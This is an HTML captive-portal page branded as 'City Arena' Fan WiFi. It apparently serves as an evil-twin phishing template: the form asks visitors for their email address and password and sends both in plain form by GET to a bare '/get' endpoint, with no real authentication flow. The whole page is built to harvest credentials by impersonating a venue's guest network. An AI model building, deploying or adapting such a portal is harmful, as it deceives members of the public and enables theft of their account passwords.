<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Arena — Fan WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0a0a0a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:420px;background:#111;border-radius:12px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,0.6)}
.top{background:linear-gradient(180deg,#1a1a1a,#111);padding:0;position:relative;overflow:hidden}
.top-inner{padding:28px 24px 22px;position:relative;z-index:2;text-align:center}
.arena-badge{display:inline-block;background:#E31837;color:#fff;font-size:9px;font-weight:800;letter-spacing:3px;text-transform:uppercase;padding:4px 12px;border-radius:2px;margin-bottom:10px}
.arena-name{font-size:22px;font-weight:900;color:#fff;letter-spacing:0.5px}
.arena-sub{font-size:10px;color:#555;letter-spacing:2px;text-transform:uppercase;margin-top:5px}
.status-bar{background:#0a0a0a;border-top:1px solid #1e1e1e;border-bottom:1px solid #1e1e1e;padding:8px 24px;display:flex;align-items:center;gap:8px}
.dot{width:7px;height:7px;background:#4ade80;border-radius:50%;flex-shrink:0}
.status-bar span{font-size:11.5px;color:#444}
.status-bar strong{color:#E31837;font-weight:600}
.body{padding:24px}
.body h2{font-size:17px;font-weight:700;color:#e0e0e0;margin-bottom:3px}
.body .sub{font-size:12.5px;color:#555;margin-bottom:18px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:#444;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1px solid #1e1e1e;border-radius:8px;font-size:14.5px;background:#0a0a0a;color:#e0e0e0}
input:focus{outline:none;border-color:#E31837;box-shadow:0 0 0 3px rgba(227,24,55,0.1)}
input::placeholder{color:#2a2a2a}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:8px;background:#E31837;color:#fff;font-size:13px;font-weight:800;letter-spacing:0.5px;cursor:pointer}
.btn:active{opacity:0.9}
.terms{font-size:11px;color:#333;text-align:center;margin-top:13px;line-height:1.6}
.terms a{color:#E31837}
.foot{background:#0a0a0a;border-top:1px solid #1e1e1e;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#333;text-decoration:none}
.foot a{color:#E31837}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="top-inner">
      <div class="arena-badge">Fan WiFi</div>
      <div class="arena-name">City Arena</div>
      <div class="arena-sub">Home of Champions</div>
    </div>
  </div>
  <div class="status-bar"><div class="dot"></div><span>Network: <strong>CityArena-FanWiFi</strong></span></div>
  <div class="body">
    <h2>Connect to Fan WiFi</h2>
    <p class="sub">Stay connected throughout the game day experience.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect Now</button>
      <p class="terms">By connecting you agree to the <a href="#">Arena WiFi Terms</a>.</p>
    </form>
  </div>
  <div class="foot"><span>City Arena Guest Services</span><a href="#">Help</a></div>
</div>
</body>
</html>
